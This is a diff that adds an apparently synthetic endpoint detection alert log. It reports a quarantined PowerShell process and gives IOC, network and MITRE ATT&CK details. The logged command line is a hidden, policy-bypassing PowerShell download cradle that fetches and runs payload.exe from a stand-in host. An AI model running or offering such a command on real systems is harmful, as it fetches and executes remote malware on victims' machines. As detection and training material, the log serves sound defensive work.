@@ -1,0 +1,33 @@
+2025-12-09 15:45:32 [CRITICAL] Endpoint Detection Alert
+====================================================
+Hostname: WKS-FINANCE-07
+User: jdoe
+Domain: CORP
+Process: powershell.exe
+PID: 4892
+Parent Process: explorer.exe (PID: 2340)
+Command Line: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://malicious-domain.com/payload.exe -OutFile C:\Temp\update.exe; Start-Process C:\Temp\update.exe"
+
+Detection Details:
+------------------
+Rule: Suspicious PowerShell download activity
+Category: Command and Control
+MITRE ATT&CK: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)
+Hash (SHA256): a3f8b92c4e1d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a
+Status: QUARANTINED
+Action Taken: Process terminated, file deleted, endpoint isolated
+
+IOC Analysis:
+-------------
+Domain: malicious-domain.com
+Reputation: Known C2 infrastructure
+First Seen: 2025-11-15
+Associated Campaigns: Ransomware Group Alpha
+Threat Level: CRITICAL
+
+Network Connections:
+-------------------
+External IP: 203.0.113.45
+Port: 443 (HTTPS)
+Bytes Transferred: 2.4 MB
+Connection Duration: 47 seconds
